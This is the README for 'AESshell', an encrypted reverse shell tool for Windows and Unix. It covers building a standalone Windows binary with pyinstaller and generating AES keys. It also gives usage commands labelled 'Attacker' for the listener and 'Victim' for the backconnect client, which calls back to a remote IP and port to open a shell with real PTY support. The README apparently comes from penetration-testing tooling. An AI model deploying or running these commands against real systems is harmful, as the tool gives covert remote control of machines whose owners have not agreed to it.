   _____  ___________ _________      .__           .__  .__   
  /  _  \ \_   _____//   _____/ _____|  |__   ____ |  | |  |  
 /  /_\  \ |    __)_ \_____  \ /  ___/  |  \_/ __ \|  | |  |  
/    |    \|        \/        \\___ \|   Y  \  ___/|  |_|  |__
\____|__  /_______  /_______  /____  >___|  /\___  >____/____/
        \/        \/        \/     \/     \/     \/           

Bright side
-----------
- python2.7 AES CBC Mode HMAC-SHA256 Backconnect Shell
- real pty support for unix (yes, you can open up vim now :))
- running on windows and unix (mac untested, works most probably)
- compiles with pyinstaller, so no python installation needed
- tries 10 times to connect back, quits afterwards
- windows binary provided
- has now a great banner ;)

Preperation
-----------
Create a new package:
$ ./prepare.py 
[*] Copy bc.py to aesout/bc.py
[*] Copy listen.py to aesout/listen.py
[*] Copy aes.py to aesout/aes.py
[*] Copy bc.spec to aesout/bc.spec
[*] Copy MSVCP90.dll to aesout/MSVCP90.dll
[*] Copy MSVCR90.dll to aesout/MSVCR90.dll
[*] Copy done
[*] New Key: aQlfNwMbxcS7vH4lEShQgDdJ2GOL9NBjwOecrUGcLj++M2C4CrV9poQJ+0Bi3MdzqRCMCqMTCbI=
[*] Found old key: F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4=
[*] aesout/bc.py ready
[*] Found old key: F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4=
[*] aesout/listen.py ready
[*] Done

Build Exe:

C:\pyinstaller -F bc.spec

Test it:
C:\dist\bc.exe

Usage listen.py
---------------
$ python2 listen.py -h

usage: AESshell client (listen.py) [-h] -lip LIP -lport LPORT -os {lnx,win}

optional arguments:
  -h, --help     show this help message and exit
  -lip LIP       Local IP you want to bind the client part
  -lport LPORT   Local Port you want to bind to
  -os {lnx,win}  expected remote OS (lnx/win)

Attacker expecting a MS remote shell:
$ python listen.py -lip 0.0.0.0 -lport 1443 -os win

Attacker expecting a unix remote shell:
$ python listen.py -lip 0.0.0.0 -lport 1443 -os lnx

Usage bc.py / bc.exe
--------------------
$ python2 bc.py -h
usage: AESshell backconnect (bc.py) [-h] -rip RIP -rport RPORT

optional arguments:
  -h, --help    show this help message and exit
  -rip RIP      Remote IP you want to connect to
  -rport RPORT  Remote Port you want to connect to

Victim MS-Windows:
C:\bc.exe -rip 192.168.1.1 -rport 1443

Victim *nix with python interpreter:
$ python bc.py -rip 192.168.1.1 -rport 1443


Files
-----
bc.exe 		- compiled with pyinstaller for windows (Tested: WinXP/Win7/Win8)
bc.spec 	- spec file for pyinstaller
bc.py 		- the backconnect shell
listen.py 	- the listener shell
prepare.py	- prepares all *.py files with a new aes key and outputs it to aesout
MSV*		- windows dlls for pyinstaller

Author
------
Marco Lux <ping@curesec.com>

Thanks
------
To Darren Martyn pointing me to his excellent PTY Class!
(https://github.com/infodox/python-pty-shells)
